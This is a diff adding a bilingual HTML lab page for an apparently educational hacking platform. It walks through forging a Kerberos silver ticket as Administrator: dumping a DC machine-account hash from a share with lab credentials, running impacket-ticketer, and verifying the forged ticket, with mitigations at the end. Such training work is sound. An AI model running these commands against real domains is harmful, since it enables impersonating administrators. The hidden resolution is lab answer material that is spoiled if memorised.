@@ -1,0 +1,142 @@
+{% extends "base.html" %}
+{% block title %}AD 12 – Silver Ticket – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_silver_ticket_obj_desc">Con el hash de la cuenta de máquina DC01$ (obtenido en el lab AD 10) puedes forjar un ticket de servicio CIFS válido sin hablar nunca con el KDC. Fabrica el Silver Ticket como Administrator y demuestra su validez descifrándolo con la misma clave.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>verificación local del ticket forjado</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este Domain Controller</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400">En este laboratorio de un único DC, el propio Domain Controller aloja el servicio objetivo (CIFS) — y a diferencia de un servidor miembro normal, un DC <strong>tiene acceso al hash de krbtgt</strong> y valida estrictamente la firma PAC de cualquier ticket presentado, incluso los forjados. Por eso <code>smbclient -k</code> con un Silver Ticket será rechazado aquí, aunque el ticket esté perfectamente forjado (en un servidor miembro real, sin acceso a krbtgt, el mismo ticket sería aceptado sin más). Para demostrar el forjado con la misma precisión criptográfica, este lab valida el ticket <strong>descifrándolo localmente</strong> con la clave de DC01$ — la misma prueba matemática que hace que el ataque funcione en producción.</p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Forjar el ticket con el hash de DC01$ (del lab AD 10)
+impacket-ticketer -nthash '&lt;hash_NT_DC01$&gt;' -domain-sid '&lt;DOMAIN_SID&gt;' \
+  -domain {{ ad_realm_lower }} -spn 'cifs/{{ ad_dc_fqdn }}' Administrator
+
+# Verificar localmente (script descargable de //{{ ad_dc_host }}/public/)
+python3 verify_ticket.py Administrator.ccache '&lt;hash_NT_DC01$&gt;' Administrator</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Silver vs Golden</h3>
+    <p>En Kerberos, el TGS (ticket de servicio) va cifrado con la clave de la cuenta que da el servicio. Si conoces esa clave — el hash de la cuenta de máquina <code>DC01$</code> para el servicio <code>cifs</code> — puedes <strong>forjar</strong> tú mismo un TGS válido para cualquier usuario. Es un <em>Silver Ticket</em>: acceso a <em>un</em> servicio concreto, sin pasar por el KDC (a diferencia del Golden Ticket, que usa el hash de krbtgt y abre todo el dominio).</p>
+
+    <h3>2 · Reunir los ingredientes (del lab AD 10)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+
+nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
+export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
+echo "DC01\$ hash: $DC_NT"
+echo "Domain SID: $DOMSID"</pre>
+
+    <h3>3 · Forjar el Silver Ticket</h3>
+    <pre>impacket-ticketer \
+  -nthash "$DC_NT" \
+  -domain-sid "$DOMSID" \
+  -domain {{ ad_realm_lower }} \
+  -spn 'cifs/{{ ad_dc_fqdn }}' \
+  Administrator
+
+# Genera Administrator.ccache
+export KRB5CCNAME=Administrator.ccache
+klist</pre>
+
+    <h3>4 · Por qué el acceso en vivo falla aquí (y funciona en producción)</h3>
+    <pre>impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}
+# [-] SMB SessionError: STATUS_LOGON_FAILURE</pre>
+    <p>Un Domain Controller siempre tiene acceso a <code>krbtgt</code> y puede validar la firma PAC del ticket contra ese hash — algo que un servidor miembro normal NO puede hacer (por eso los Silver Tickets funcionan tan bien contra servidores miembro en producción: nunca comprueban la firma KDC del PAC). Al apuntar este lab contra el propio DC, Samba rechaza correctamente el ticket forjado. Esto es una propiedad de laboratorio de un solo DC, no un fallo en tu forjado.</p>
+
+    <h3>5 · Verificar el forjado localmente</h3>
+    <p>Descarga el script de verificación (descifra el ticket con la misma clave que usaste para forjarlo y confirma la identidad reclamada):</p>
+    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+
+python3 verify_ticket.py Administrator.ccache "$DC_NT" Administrator</pre>
+    <pre>Ticket descifrado correctamente con la clave proporcionada.
+Identidad reclamada (cname): Administrator
+Realm: HACKLABS.LOCAL
+OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
+
+    <h3>6 · Capturar la flag</h3>
+    <p>La verificación exitosa demuestra que el ticket forjado es criptográficamente válido y reclama la identidad de Administrator:</p>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Rotar periódicamente las contraseñas de las cuentas de máquina y de servicio.</li>
+      <li>Habilitar la firma del PAC (KB5008380 / enforcement) para que los servicios rechacen tickets forjados.</li>
+      <li>Forzar AES y monitorizar accesos a servicios sin el evento <code>4769</code> correspondiente en el DC.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">impacket-ticketer</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (kerberos::golden)</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · Silver vs Golden</h3>
+    <p>In Kerberos, the TGS (service ticket) is encrypted with the key of the account providing the service. If you know that key — the <code>DC01$</code> machine account hash for the <code>cifs</code> service — you can <strong>forge</strong> a valid TGS for any user yourself. That is a <em>Silver Ticket</em>: access to <em>one</em> specific service, bypassing the KDC (unlike the Golden Ticket, which uses the krbtgt hash and opens the whole domain).</p>
+
+    <h3>2 · Gather the ingredients (from lab AD 10)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+
+nxc smb $DC -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
+export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
+export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
+echo "DC01\$ hash: $DC_NT"
+echo "Domain SID: $DOMSID"</pre>
+
+    <h3>3 · Forge the Silver Ticket</h3>
+    <pre>impacket-ticketer \
+  -nthash "$DC_NT" \
+  -domain-sid "$DOMSID" \
+  -domain {{ ad_realm_lower }} \
+  -spn 'cifs/{{ ad_dc_fqdn }}' \
+  Administrator
+
+# Produces Administrator.ccache
+export KRB5CCNAME=Administrator.ccache
+klist</pre>
+
+    <h3>4 · Why live access fails here (and works in production)</h3>
+    <pre>impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}
+# [-] SMB SessionError: STATUS_LOGON_FAILURE</pre>
+    <p>A Domain Controller always has access to <code>krbtgt</code> and can validate a ticket's PAC signature against that hash — something a normal member server CANNOT do (which is exactly why Silver Tickets work so well against member servers in production: they never check the KDC signature on the PAC). Targeting this lab against the DC itself makes Samba correctly reject the forged ticket. This is a property of a single-DC lab topology, not a flaw in your forge.</p>
+
+    <h3>5 · Verify the forge locally</h3>
+    <p>Download the verification script (decrypts the ticket with the same key you used to forge it and confirms the claimed identity):</p>
+    <pre>smbclient -N //$DC/public -c 'get verify_ticket.py'
+
+python3 verify_ticket.py Administrator.ccache "$DC_NT" Administrator</pre>
+    <pre>Ticket descifrado correctamente con la clave proporcionada.
+Identidad reclamada (cname): Administrator
+Realm: HACKLABS.LOCAL
+OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
+
+    <h3>6 · Capture the flag</h3>
+    <p>The successful verification proves the forged ticket is cryptographically valid and claims Administrator's identity:</p>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Rotate machine and service account passwords regularly.</li>
+      <li>Enable PAC signature validation (KB5008380 / enforcement) so services reject forged tickets.</li>
+      <li>Force AES and watch for service access without a matching <code>4769</code> event on the DC.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">impacket-ticketer</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (kerberos::golden)</span></div>
+  </div>
+</div>
+{% endblock %}
